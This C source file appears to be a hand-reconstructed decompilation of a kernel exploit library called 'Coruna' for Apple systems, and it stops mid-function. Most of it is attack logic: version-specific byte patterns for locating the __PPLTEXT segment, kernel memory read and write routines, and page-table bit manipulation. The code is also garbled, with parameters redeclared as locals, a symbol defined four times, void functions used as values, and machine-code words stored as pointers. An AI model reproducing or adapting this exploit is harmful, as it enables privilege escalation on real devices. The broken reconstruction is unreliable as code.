/*
 * Coruna kernel exploit dylib (kernel29bb0) — hand-reconstructed native C
 *
 * Rebuild: hand-reconstructed — skipped by rebuild_native_source.py
 * Standard: Framework/coruna/docs/NATIVE_SOURCE_STANDARD.md
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <IOKit/IOKitLib.h>
typedef struct { uint64_t q0; uint64_t q1; } coruna_svc_regpack_t;


static inline bool coruna_ldrex_pass(void *addr, size_t size)
{
    (void)addr;
    (void)size;
    return true;
}

static inline bool coruna_ldrexp_clear(void)
{
    return true;
}


typedef void (*coruna_implant_trampoline_fn)(void);

static inline uint64_t coruna_u64_pack(uint32_t hi, uint32_t lo)
{
    return ((uint64_t)hi << 32) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack71(uint64_t hi7, uint8_t lo)
{
    return (hi7 << 8) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack14(uint8_t hi, uint64_t lo)
{
    return ((uint64_t)hi << 32) | (uint32_t)lo;
}

static inline uint64_t coruna_cat(uint64_t hi, uint64_t lo)
{
    return (hi << 32) | (uint32_t)lo;
}



/* Kernel module runtime constants (from Mach-O image) */
static uint64_t k_kernel_slot_1001;
static uint64_t k_kernel_slot_1100;
static uint64_t k_kernel_slot_1888;
static uint64_t k_kernel_slot_1890;
static uint64_t k_kernel_slot_18a0;
static uint64_t k_kernel_slot_18a8;
static uint64_t k_kernel_slot_18b0;
static uint64_t k_kernel_slot_18b8;
static uint64_t k_kernel_slot_18c8;
static uint64_t k_kernel_slot_18e0;
static uint64_t k_kernel_slot_18e8;
static uint64_t k_kernel_slot_18f0;
static uint64_t k_kernel_slot_18f8;
static uint64_t k_kernel_slot_1900;
static uint64_t k_kernel_slot_1908;
static uint64_t k_kernel_slot_1910;
static uint64_t k_kernel_slot_1914;
static uint64_t k_kernel_slot_1918;
static uint64_t k_kernel_slot_191c;
static uint64_t k_kernel_slot_1920;
static uint64_t k_kernel_slot_1928;
static uint64_t k_kernel_slot_192c;
static uint64_t k_kernel_slot_1930;
static uint64_t k_kernel_slot_1934;
static uint64_t k_kernel_slot_1938;
static uint64_t k_kernel_slot_193c;
static uint64_t k_kernel_slot_1940;
static uint64_t k_kernel_slot_1960;
static uint64_t k_kernel_slot_1990;
static uint64_t k_kernel_slot_1998;
static uint64_t k_kernel_slot_19c8;
static uint64_t k_kernel_slot_19d0;
static uint64_t k_kernel_slot_19d8;
static uint64_t k_kernel_slot_19e0;
static uint64_t k_kernel_slot_19e8;
static uint64_t k_kernel_slot_19f0;
static uint64_t k_kernel_slot_19f8;
static uint64_t k_kernel_slot_1a00;
static uint64_t k_kernel_slot_1a08;
static uint64_t k_kernel_slot_1a10;
static uint64_t k_kernel_slot_1a18;
static uint64_t k_kernel_slot_1d08;
static uint64_t k_kernel_slot_1d10;
static uint64_t k_kernel_slot_1d18;
static uint64_t k_kernel_slot_1d20;
static uint64_t k_kernel_slot_1d28;
static uint64_t k_kernel_slot_1d30;
static uint64_t k_kernel_slot_1d38;
static uint64_t k_kernel_slot_1d48;
static uint64_t k_kernel_slot_2710;
static uint64_t k_kernel_slot_4001;
static uint64_t k_kernel_slot_4201;
static uint8_t k_kernel_rodata_word_2803d = 0x00;
static uint64_t k_kernel_rodata_word_2803e = 0x007717fffd045280ULL;
static uint64_t k_kernel_rodata_word_28041 = 0x68b400007717fffdULL;
static uint64_t k_kernel_rodata_word_2adf0 = 0x1e6020401e680822ULL;
static uint64_t k_kernel_rodata_word_2ae20 = 0xaa1903e09100e3e1ULL;
static uint64_t k_kernel_rodata_word_2ae28 = 0x350005a097ff9838ULL;
static uint64_t k_kernel_rodata_word_2ae30 = 0x4b150129294727e8ULL;
static uint64_t k_kernel_rodata_word_2ae38 = 0xaa1303f4aa1b03faULL;
static uint64_t k_kernel_rodata_word_2ae40 = 0x540001e16b09011fULL;
static uint64_t k_kernel_rodata_word_2ae48 = 0x360000891400001dULL;
static uint64_t k_kernel_rodata_word_2ae50 = 0xaa1303f4aa1b03faULL;
static uint64_t k_kernel_rodata_word_2ae58 = 0x510005081400000cULL;
static uint64_t k_kernel_rodata_word_2ae60 = 0x540001216b08037fULL;
static uint64_t k_kernel_rodata_word_2ae84 = 0xeb14027f97ff98d0ULL;
static uint64_t k_kernel_rodata_word_2aea8 = 0x11007f5a72a0005aULL;
static uint64_t k_kernel_rodata_word_2aed0 = 0xb90001b5b900015cULL;
static uint64_t k_kernel_rodata_word_2aed8 = 0x14000003b9000188ULL;
static uint64_t k_kernel_rodata_word_2aee0 = 0x72a0005a5290025aULL;
static uint64_t k_kernel_rodata_word_2aee8 = 0xa94a7bfdaa1a03e0ULL;
static uint64_t k_kernel_rodata_word_2aef0 = 0xa94857f6a9494ff4ULL;
static uint64_t k_kernel_rodata_word_2af10 = 0xa9bd57f6d503237fULL;
static uint64_t k_kernel_rodata_word_2af18 = 0xa9027bfda9014ff4ULL;
static uint64_t k_kernel_rodata_word_2af20 = 0xaa0403f3910083fdULL;
static uint64_t k_kernel_rodata_word_2af30 = 0xb40001a1f9400021ULL;
static uint64_t k_kernel_rodata_word_2af50 = 0x72a0004852900508ULL;
static uint64_t k_kernel_rodata_word_2af70 = 0x52800022aa0203e1ULL;
static uint64_t k_kernel_rodata_word_2af78 = 0x5280000552808003ULL;
static uint64_t k_kernel_rodata_word_2af80 = 0x97fffe33aa1403e6ULL;
static uint16_t k_kernel_rodata_word_2e007 = 0x3091;
static uint64_t k_kernel_rodata_word_2e009 = 0x11d71f0a11f94002ULL;
static uint64_t k_kernel_rodata_word_2e00f = 0x028231d0000011d7ULL;
static uint64_t k_kernel_rodata_word_2e012 = 0x023091028231d000ULL;
static uint64_t k_kernel_rodata_word_2ae00 = 0x1a9f57ea1e602020ULL;
static uint64_t k_kernel_rodata_word_2ae10 = 0x340001e9540001e1ULL;
static uint64_t k_kernel_rodata_word_2ae70 = 0xaa1903e09100f3e1ULL;
static uint64_t k_kernel_rodata_word_2aeb0 = 0xaa0003fa1400000eULL;
static uint64_t k_kernel_rodata_word_2aec0 = 0x5280001aa940b3edULL;
static uint64_t k_kernel_rodata_word_2af00 = 0x6d4423e9a9456ffcULL;
static uint64_t k_kernel_rodata_word_2af40 = 0x52800004d2800003ULL;
static uint64_t k_kernel_rodata_word_2af60 = 0x140000181a800100ULL;
static uint64_t k_kernel_rodata_word_2af90 = 0xd280000352800002ULL;
static uint64_t k_kernel_rodata_word_2afa0 = 0x17ffffe5f9400281ULL;
static uint64_t k_kernel_rodata_word_2afb0 = 0x12800003aa1303e2ULL;
static uint64_t k_kernel_rodata_word_2afc0 = 0xa9427bfd52800000ULL;
static uint64_t k_kernel_rodata_word_2afd0 = 0xd503237fd65f0fffULL;
static uint64_t k_kernel_rodata_word_2afe0 = 0xa90357f6a9025ff8ULL;
static uint64_t k_kernel_rodata_word_2aff0 = 0xd10243ff910143fdULL;
static uint64_t k_kernel_rodata_word_2b000 = 0x5802b7e8d503201fULL;
static uint64_t k_kernel_rodata_word_2b010 = 0x1283ea49b9414008ULL;
static uint64_t k_kernel_rodata_word_2b020 = 0x5280151554000082ULL;
static uint64_t k_kernel_rodata_word_2b030 = 0x6b09011f52838369ULL;
static uint64_t k_kernel_rodata_word_2b03c = 0x92bd7409f940ae88ULL;
static void *k_kernel_ndr_record_slot = (void *)0xf90013e094000790ULL;
static void *k_kernel_sandbox_check_no_report_slot = (void *)0xd2dffc8814000005ULL;
static void *k_kernel_kernelversionstring_slot = (void *)0xf90013e8f2ffffe8ULL;
static void *k_kernel_chkstk_darwin_slot = (void *)0x540004016b08001fULL;
static void *k_kernel_chkstk_darwin_slot = (void *)0x350003a094000742ULL;
static void *k_kernel_chkstk_darwin_slot = (void *)0xf94047e9b9408388ULL;
static void *k_kernel_chkstk_darwin_slot = (void *)0xb94107e0b9000128ULL;
static void *k_kernel_stack_chk_guard_slot = (void *)0x321c03425280011aULL;
static void *k_kernel_get_cpu_capabilities_slot = (void *)0x52800001911543e0ULL;
static void *k_kernel_bootstrap_port_slot = (void *)0x52804203f9000be2ULL;
static void *k_kernel_dyldversionnumber_slot = (void *)0x290d6b7f940006d8ULL;
static void *k_kernel_kcfallocatordefault_slot = (void *)0xf9404be8fd003368ULL;
static void *k_kernel_kcfallocatornull_slot = (void *)0xd2800013340025a8ULL;
static void *k_kernel_kiomasterportdefault_slot = (void *)0xf90047e8f9404fe8ULL;
static void *k_kernel_mach_absolute_time_slot = (void *)0x927d7268b900839fULL;
static void *k_kernel_mach_task_self_slot = (void *)0x8b090108f94013e9ULL;
static void *k_kernel_task_generate_corpse_slot = (void *)0x911543e194000776ULL;
static void *k_kernel_thread_get_special_reply_port_slot = (void *)0xf9400be2910ac3e3ULL;
static void *k_kernel_vm_page_mask_slot = (void *)0x97ff913ef9003b68ULL;
static void *k_kernel_vm_page_size_slot = (void *)0xb9001fe0b9412f28ULL;


void coruna_fn_ptr_cast(void)
{
  return;
}





uint32_t coruna_cfdictionaryapplyfunction(long handle,long addr_2)
{
  long handle;
  long addr;
  uint64_t u;
  uint32_t scratch[2];
  long bootargs;
  
  scratch[0] = 0xad001;
  if (handle != 0) {
    handle = _CFGetTypeID();
    addr = _CFDictionaryGetTypeID();
    if ((handle == addr) && (addr_2 != 0)) {
      handle = _CFGetTypeID(addr_2);
      addr = _CFDictionaryGetTypeID();
      if (handle == addr) {
        scratch[0] = 0;
        bootargs = handle;
        u = coruna_fn_ptr_cast(coruna_cfboolean_typeid);
        _CFDictionaryApplyFunction(addr_2,u,scratch);
      }
    }
  }
  return scratch[0];
}





void coruna_cfboolean_typeid(long handle,long addr_2,int *flags)
{
  int err;
  long handle;
  long addr;
  long off;
  uint64_t u;
  uint64_t size;
  long scratch;
  int bootargs [2];
  long thread_attr;
  
  if (flags == (int *)0x0) {
    return;
  }
  if (*flags != 0) {
    return;
  }
  if ((handle == 0) || (addr_2 == 0)) {
    err = 0xad001;
  }
  else {
    handle = _CFGetTypeID(addr_2);
    addr = _CFStringGetTypeID();
    if ((((addr == handle) || (addr = _CFArrayGetTypeID(), addr == handle)) ||
        (addr = _CFBooleanGetTypeID(), addr == handle)) ||
       (addr = _CFNumberGetTypeID(), addr == handle)) {
      scratch = 0;
      err = _CFDictionaryGetValueIfPresent(*(uint64_t *)(flags + 2),handle,&scratch);
      if (err == 0) {
fail:
        if (*flags != 0) {
          return;
        }
        _CFDictionarySetValue(*(uint64_t *)(flags + 2),handle,addr_2);
        return;
      }
      handle = _CFGetTypeID(scratch);
      addr = _CFGetTypeID(addr_2);
      if (addr == handle) {
        off = _CFArrayGetTypeID();
        addr = scratch;
        if (off == handle) {
          err = 0xad001;
          if (scratch != 0) {
            handle = _CFGetTypeID(scratch);
            off = _CFArrayGetTypeID();
            if (handle == off) {
              handle = _CFGetTypeID(addr_2);
              off = _CFArrayGetTypeID();
              if (handle == off) {
                handle = _CFGetTypeID(addr_2);
                off = _CFArrayGetTypeID();
                err = 0xad001;
                if (handle == off) {
                  bootargs[0] = coruna_cat(bootargs[0],1);
                  u = _CFArrayGetCount(addr_2);
                  size = coruna_fn_ptr_cast(coruna_cfstringgettypeid);
                  _CFArrayApplyFunction(addr_2,0,u,size,bootargs);
                  if ((char)bootargs[0] == '\0') {
                    err = 0xad014;
                  }
                  else {
                    bootargs[0] = 0;
                    thread_attr = addr;
                    u = _CFArrayGetCount(addr_2);
                    size = coruna_fn_ptr_cast(coruna_cfarray_append_unique);
                    _CFArrayApplyFunction(addr_2,0,u,size,bootargs);
                    err = bootargs[0];
                  }
                }
              }
            }
          }
          *flags = err;
          return;
        }
        if (*flags != 0) {
        return;
        }
        _CFDictionarySetValue(*(uint64_t *)(flags + 2),handle,addr_2);
        return;
      }
    }
    err = 0xad014;
  }
  *flags = err;
  return;
}





uint32_t coruna_cfdictionaryapplyfunction_7ba4(long handle,long addr_2)
{
  long handle;
  long addr;
  uint64_t u;
  uint32_t scratch[2];
  long bootargs;
  
  scratch[0] = 0xad001;
  if (handle != 0) {
    handle = _CFGetTypeID();
    addr = _CFDictionaryGetTypeID();
    if ((handle == addr) && (addr_2 != 0)) {
      handle = _CFGetTypeID(addr_2);
      addr = _CFDictionaryGetTypeID();
      if (handle == addr) {
        scratch[0] = 0;
        bootargs = handle;
        u = coruna_fn_ptr_cast(coruna_cf_equal);
        _CFDictionaryApplyFunction(addr_2,u,scratch);
      }
    }
  }
  return scratch[0];
}





void coruna_cf_equal(long handle,long addr_2,int *flags)
{
  int err;
  long handle;
  long addr;
  uint64_t u;
  uint64_t size;
  int scratch [2];
  uint64_t bootargs;
  uint64_t thread_attr;
  
  if (flags == (int *)0x0) {
    return;
  }
  if (*flags != 0) {
    return;
  }
  if ((handle == 0) || (addr_2 == 0)) {
    scratch[0] = 0xad001;
  }
  else {
    thread_attr = 0;
    err = _CFDictionaryGetValueIfPresent(*(uint64_t *)(flags + 2),handle,&thread_attr);
    if (err == 0) {
      scratch[0] = 0xad011;
    }
    else {
      handle = _CFGetTypeID(thread_attr);
      addr = _CFGetTypeID(addr_2);
      if (addr == handle) {
        addr = _CFArrayGetTypeID();
        if (addr == handle) {
          scratch[0] = 0;
          bootargs = thread_attr;
          u = _CFArrayGetCount(addr_2);
          size = coruna_fn_ptr_cast(coruna_cfarraycontainsvalue);
          _CFArrayApplyFunction(addr_2,0,u,size,scratch);
          *flags = scratch[0];
          return;
        }
        err = _CFEqual(addr_2,thread_attr);
        if (err != 0) {
          *flags = 0;
          return;
        }
      }
      scratch[0] = 0xad014;
    }
  }
fail:
  *flags = scratch[0];
  return;
}





void coruna_cfarray_append_unique(long handle,int *flags)
{
  void (*ptr)(void);
  int err;
  uint64_t u;
  uint64_t size;
  unsigned long unaff_x30;
  
  if ((flags != (int *)0x0) && (*flags == 0)) {
    if (handle == 0) {
      *flags = 0xad001;
    }
    else {
      size = *(uint64_t *)(flags + 2);
      u = _CFArrayGetCount(size);
      err = _CFArrayContainsValue(size,0,u,handle);
      if (err == 0) {
        if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
        _CFArrayAppendValue(*(uint64_t *)(flags + 2),handle);
        return;
      }
    }
  }
  return;
}





void coruna_cfstringgettypeid(long handle,uint8_t *buf)
{
  long handle;
  long addr;
  
  if (buf != (uint8_t *)0x0) {
    if (handle != 0) {
      handle = _CFGetTypeID();
      addr = _CFStringGetTypeID();
      if (handle == addr) {
        return;
      }
    }
    *buf = 0;
  }
  return;
}





void coruna_cfarraycontainsvalue(long handle,int *flags)
{
  int err;
  uint64_t u;
  uint64_t size;
  
  if ((flags != (int *)0x0) && (*flags == 0)) {
    err = 0xad001;
    if (handle != 0) {
      size = *(uint64_t *)(flags + 2);
      u = _CFArrayGetCount(size);
      err = _CFArrayContainsValue(size,0,u,handle);
      if (err != 0) {
        return;
      }
      err = 0xad011;
    }
    *flags = err;
  }
  return;
}





bool coruna_kernel29bb0_via_ctx_test_flag(uint64_t val)
{
  int err;
  
  err = coruna_ctx_test_flag(val,0x5184001);
  return err != 0;
}





uint64_t coruna_return_zero_d6bc(long handle,unsigned long arg,long addr_2,unsigned long arg)
{
  unsigned long u;
  uint size;
  unsigned long version;
  int err;
  uint64_t port;
  unsigned long tag;
  unsigned long kind;
  long handle;
  unsigned long type_id;
  unsigned long type_id_8;
  unsigned long type_id_9;
  unsigned long scratch;
  uint64_t bootargs;
  unsigned long thread_attr;
  long host_info;
  
  thread_attr = 0;
  host_info = 0;
  scratch = 0;
  bootargs = 0;
  port = coruna_ctx_test_flag(handle,0x5184001);
  if ((int)port == 0) {
    return port;
  }
  if (arg == 0) {
    return 0;
  }
  if (addr_2 == 0) {
    return 0;
  }
  if ((int)arg == 0) {
    return 0;
  }
  if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
    port = coruna_find_ppltext(handle,&thread_attr,(long)&bootargs + 4);
    version = thread_attr;
    if ((int)port == 0) {
      return port;
    }
    if (thread_attr <= arg) {
      u = arg + (arg & 0xffffffff);
      size = bootargs;
      type_id_8 = (unsigned long)bootargs;
      if (u <= thread_attr + type_id_8) {
        port = coruna_kernel29bb0_via_return_zero_21bb4(handle,3,&host_info);
        if ((int)port == 0) {
          return port;
        }
        if (host_info == 0) {
          type_id = type_id_8 + 8;
          if (size < 0x8c001 && *(long *)(handle + 0x158) + 0xffe7f6f5f8700000U < 0xf78900000) {
            type_id = 0x8c008;
          }
          kind = (unsigned long)*(uint *)(handle + 0x180);
          tag = 0;
          if (kind != 0) {
            tag = type_id / kind;
          }
          handle = type_id - tag * kind;
          err = 0;
          if (handle != 0) {
            err = *(uint *)(handle + 0x180) - (int)handle;
          }
          bootargs = coruna_u64_pack((bootargs), (int)type_id + err);
          host_info = coruna_vm_deallocate_2c8ec(handle,&bootargs);
          if (host_info == 0) {
            return 0;
          }
          port = coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_1aa94_3(handle,3,host_info);
          if ((int)port == 0) {
            return port;
          }
        }
        tag = *(unsigned long *)(handle + 0x188);
        for (type_id = arg & (tag ^ 0xffffffffffffffff);
            type_id <= (u - 1 & (tag ^ 0xffffffffffffffff));
            type_id = type_id + *(uint *)(handle + 0x180)) {
          port = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,host_info + type_id_8,8,&scratch);
          if ((int)port == 0) {
            return port;
          }
          kind = type_id - version;
          type_id_9 = (unsigned long)(1 << (unsigned long)((uint)(kind >> 0xe) & 0x1f));
          if ((scratch & type_id_9) == 0) {
            port = coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_15ee8(handle,host_info + kind,type_id);
            if ((int)port == 0) {
              return port;
            }
            scratch = scratch | type_id_9;
            port = coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,host_info + type_id_8,&scratch,8);
            if ((int)port == 0) {
              return port;
            }
          }
        }
        port = coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,(arg - version) + host_info,addr_2,arg);
        err = (int)port;
        goto joined_r0x0000809c;
      }
    }
    port = 0;
  }
  else {
    port = coruna_kernel29bb0_via_slot_clear(handle,arg,addr_2,arg,0);
    err = (int)port;
joined_r0x0000809c:
    if (err != 0) {
      port = 1;
    }
  }
  return port;
}





bool coruna_kernel29bb0_via_slot_clear(long handle,unsigned long arg,uint64_t val,unsigned long arg,uint64_t id_2)
{
  int err;
  uint u;
  unsigned long *ptr;
  unsigned long size;
  unsigned long version;
  long handle;
  long addr;
  unsigned long port;
  uint scratch;
  long bootargs;
  
  err = coruna_mach_absolute_time_1b5b4(handle,5,&k_kernel_slot_2710);
  return err == 0;
}





uint64_t coruna_find_ppltext(long handle,long *addr_2,int *flags)
{
  bool err;
  uint64_t u;
  long handle;
  int err;
  int status;
  unsigned long size;
  long addr;
  char *ptr;
  uint64_t scratch;
  long bootargs;
  unsigned long thread_attr;
  uint64_t host_info;
  long serial_buf;
  unsigned long action;
  
  addr = *(long *)(&k_kernel_slot_1888 + handle);
  if (addr == 0) {
    err = *(int *)(*(long *)(&k_kernel_slot_19f8 + handle) + 0x70);
    if (err < 0x2258) {
      if (err - 0x1f53U < 2) {
        ptr = "1F 01 13 EB 20 91 53 FA .. .. 00 54 68 02";
      }
      else if (err != 0x1809) {
        status = 0x1c1b;
        if (err != status) {
          ptr = (char *)0x0;
        }
        else {
          ptr = "1F 01 13 EB 20 91 53 FA .. .. 00 54 68 02";
        }
      }
      else {
        ptr = "1F 01 .. EB 20 91 .. FA .. .. 00 54";
      }
    }
    else {
      if (err != 0x2258 && err != 0x225c) {
        status = 0x2712;
        if (err != status) {
          ptr = (char *)0x0;
        }
        else {
          ptr = "1F 01 13 EB 20 91 53 FA .. .. 00 54 68 02";
        }
      }
      else {
        ptr = "1F 01 13 EB 20 91 53 FA .. .. 00 54 68 02";
      }
    }
    coruna_macho_find_loadcmd(&host_info,*(long *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
    if ((*(unsigned long *)(handle + 0x158) < 0x18091980200000) || (0x1c1a < *(int *)(handle + 0x140))) {
      bootargs = serial_buf;
      scratch = host_info;
      thread_attr = action;
      handle = coruna_strsep(&scratch,ptr,0,1);
      if (handle != 0) {
        addr = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0x10);
        if (addr == 0) {
          addr = 0;
        }
        else {
          addr = coruna_kernel29bb0_trampoline_00010cac(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr);
        }
        if (*(int *)(handle + 0x140) < 0x1c1b) {
          err = 0;
        }
        else {
          handle = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -8);
          if ((handle == 0) ||
             (handle = coruna_kernel29bb0_trampoline_00010cac(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle), handle == 0
             )) {
            return 0;
          }
          err = (int)handle - (int)addr;
        }
        if (addr != 0) {
          if (*(int *)(handle + 0x140) < 0x1c1b) {
            if (*(int *)(handle + 0x140) < 0x1809) {
              err = 0x90000;
            }
            else {
              err = 0x88000;
              if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
                err = 0x8c000;
              }
            }
          }
          *(long *)(&k_kernel_slot_1888 + handle) = addr;
          *(int *)(&k_kernel_slot_1890 + handle) = err;
          *addr_2 = addr;
          *flags = err;
          return 1;
        }
      }
    }
    else if (serial_buf != 0) {
      size = (unsigned long)*(uint *)(handle + 0x180);
      err = size <= action;
      action = action - size;
      if (err && action != 0) {
        serial_buf = serial_buf + size;
        bootargs = serial_buf;
        scratch = host_info;
        thread_attr = action;
        handle = coruna_strsep(&scratch,ptr,0,1);
        if (handle != 0) {
          addr = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0x10);
          if (addr == 0) {
            addr = 0;
          }
          else {
            addr = coruna_kernel29bb0_trampoline_00010cac(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr);
          }
          if (*(int *)(handle + 0x140) < 0x1c1b) {
            err = 0;
          }
          else {
            handle = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -8);
            if ((handle == 0) ||
               (handle = coruna_kernel29bb0_trampoline_00010cac(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle), handle == 0
               )) {
              return 0;
            }
            err = (int)handle - (int)addr;
          }
          if (addr != 0) {
            if (*(int *)(handle + 0x140) < 0x1c1b) {
              if (*(int *)(handle + 0x140) < 0x1809) {
                err = 0x90000;
              }
              else {
                err = 0x88000;
                if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
                  err = 0x8c000;
                }
              }
            }
            *(long *)(&k_kernel_slot_1888 + handle) = addr;
            *(int *)(&k_kernel_slot_1890 + handle) = err;
            *addr_2 = addr;
            *flags = err;
            return 1;
          }
        }
      }
    }
    return 0;
  }
  err = *(int *)(&k_kernel_slot_1890 + handle);
  *addr_2 = addr;
  *flags = err;
  return 1;
}





uint64_t coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8_15ee8(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  unsigned long u;
  long handle;
  unsigned long size;
  uint64_t version;
  unsigned long port;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  unsigned long bootargs;
  long thread_attr [2];
  char host_info;
  uint64_t host_info;
  uint64_t serial_buf;
  unsigned long serial_buf;
  
  serial_buf = 0;
  thread_attr[1] = 0;
  thread_attr[0] = 0;
  serial_buf = 0;
  host_info = 0;
  bootargs = 0;
  scratch = 0;
  scratch = 0;
  thread_attr = 0;
  bootargs = 0;
  version = coruna_call_mach_vm_machine_attribute_29df8_15ee8(val,size_3,&scratch);
  u = bootargs;
  if ((int)version == 0) {
    return version;
  }
  if (bootargs == '\x03') {
    version = coruna_call_mach_vm_machine_attribute_29df8_15ee8(val,id_2,thread_attr);
    size = serial_buf;
    handle = thread_attr[0];
    if ((int)version == 0) {
      return version;
    }
    if (host_info == '\x03') {
      u = serial_buf & 0x3fff | (u >> 0xe & 0x3ffffffff) << 0xe;
      port = serial_buf & 0xffff000000000000 | u;
      if (((int)u != (int)serial_buf) &&
         (version = coruna_pthread_attr_setdetachstate(val,thread_attr[0],port), (int)version == 0)) {
        return version;
      }
      if ((size >> 0x20 != port >> 0x20) &&
         (version = coruna_pthread_attr_setdetachstate(val,handle + 4,port >> 0x20), (int)version == 0)) {
        return version;
      }
      coruna_semaphore_timedwait(val,&k_kernel_slot_2710);
      return 1;
    }
  }
  return 0;
}





void coruna_kernel29bb0_via_pthread_attr_setdetachstate(long handle,unsigned long arg,uint64_t val)
{
  void (*ptr)(void);
  int err;
  unsigned long unaff_x30;
  uint scratch;
  unsigned long bootargs;
  uint32_t thread_attr;
  
  thread_attr = (uint32_t)val;
  bootargs = 0;
  scratch = 0;
  err = coruna_ctx_test_flag(handle,0x5184001);
  if (err != 0) {
    if (0x1f52ffffffffff < *(unsigned long *)(handle + 0x158)) {
fail:
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
      coruna_pthread_attr_setdetachstate(handle,arg,val);
      return;
    }
    err = coruna_find_ppltext(handle,&bootargs,&scratch);
    if (err != 0) {
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
      ___stack_chk_fail();
      }
      coruna_pthread_attr_setdetachstate(handle,arg,val);
      return;
    }
  }
  return;
}





uint64_t coruna_vm_deallocate_f7f8(long handle,long addr_2,long off_3,uint size)
{
  long handle;
  uint u;
  uint8_t *ptr;
  kern_return_t lk4;
  int err;
  uint64_t size;
  unsigned long version;
  uint port;
  void *scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  lk4 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(vm_address_t *)&scratch,
                       (unsigned long)*(uint *)(handle + 0x180),1);
  if (lk4 == 0) {
    size = coruna_kernel29bb0_via_return_zero_30860_230e0(handle,addr_2);
    port = 0;
    do {
      handle = addr_2 + (unsigned long)port;
      u = *(int *)(handle + 0x180) - ((uint)handle & *(uint *)(handle + 0x188));
      if (size - port <= u) {
        u = size - port;
      }
      version = (unsigned long)u;
      err = coruna_call_mach_vm_machine_attribute_29df8_18d98(handle,handle,version,scratch);
      if (err == 0) {
fail:
        size = 0;
        goto done;
      }
      err = _memcmp(scratch,(void *)(off_3 + (unsigned long)port),version);
      if ((err != 0) &&
         (err = coruna_return_zero_e210(handle,handle,(void *)(off_3 + (unsigned long)port),version,size,0),
         err == 0)) goto fail;
      port = u + port;
    } while (port != size);
    size = 1;
done:
    _vm_deallocate(*(vm_map_t *)ptr,(vm_address_t)scratch,(unsigned long)*(uint *)(handle + 0x180));
  }
  else {
    size = 0;
  }
  return size;
}





uint64_t coruna_kernel29bb0_via_return_zero_30860_230e0(long handle,unsigned long arg)
{
  long handle;
  uint64_t u;
  
  handle = coruna_return_zero_30860_230e0(handle,arg,0,arg);
  if ((handle == 0) &&
     (((handle = *(long *)(&k_kernel_slot_19f8 + handle), handle == 0 ||
       (arg < *(unsigned long *)(handle + 0xe0))) ||
      (*(long *)(handle + 0xe8) + *(unsigned long *)(handle + 0xe0) <= arg)))) {
    u = 0;
  }
  else {
    u = 1;
  }
  return u;
}





unsigned long coruna_return_zero_e210(long arg,unsigned long val,long n,unsigned long m,unsigned long p,
                  uint64_t q)

{
  void (*ptr)(void);
  int err;
  unsigned long u;
  unsigned long unaff_x30;
  uint64_t scratch[2];
  byte bootargs;
  uint thread_attr;
  
  if (val == 0) {
    return 0;
  }
  if (n == 0) {
    return 0;
  }
  if ((int)m == 0) {
    return 0;
  }
  u = val & (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff);
  if (u == ((val + (m & 0xffffffff)) - 1 &
               (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff))) {
    if ((p & 1) != 0) {
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
        u = coruna_kernel29bb0_via_slot_clear(arg,val,n,m,q);
        return u;
      }
    ___stack_chk_fail();
}
    u = coruna_call_mach_vm_machine_attribute_29df8_15ee8(arg,u,scratch);
    if ((int)u == 0) {
      return u;
    }
    if ((bootargs | 2) == 3) {
      if ((thread_attr >> 7 & 1) != 0) {
        u = coruna_kernel29bb0_via_pthread_attr_setdetachstate(arg,scratch[0],thread_attr & 0xffffff7f);
        if ((int)u == 0) {
          return u;
        }
        coruna_semaphore_timedwait(arg,&k_kernel_slot_2710);
      }
      err = coruna_memcpy_e3d0(arg,val,n,m,q);
      return (unsigned long)(err != 0);
    }
  }
  return 0;
}





uint64_t coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670(long handle,uint64_t val,long addr_2)
{
  uint64_t u;
  long scratch;
  long bootargs;
  
  bootargs = addr_2;
  u = coruna_ctx_test_flag(handle,0x5184001);
  if (((int)u != 0) && (u = coruna_kernel29bb0_trampoline_0001a670(handle,val,&scratch), (int)u != 0))
  {
    if (scratch != addr_2) {
      u = coruna_kernel29bb0_via_return_zero_30860_230e0(handle,val);
      u = coruna_return_zero_e210(handle,val,&bootargs,*(uint32_t *)(handle + 0x168),u,1);
      if ((int)u == 0) {
        return u;
      }
    }
    u = 1;
  }
  return u;
}





uint64_t coruna_memcpy_e3d0(long handle,uint64_t val,uint64_t id_2,int flags,int count_2)
{
  int err;
  uint64_t u;
  uint64_t scratch;
  
  if ((count_2 == 0) || (*(int *)(handle + 0x168) != flags)) {
    u = coruna_call_mach_vm_machine_attribute_29df8_1aa94(handle,val);
    err = (int)u;
  }
  else {
    scratch = 0;
    ___memcpy_chk(&scratch,id_2,flags,8);
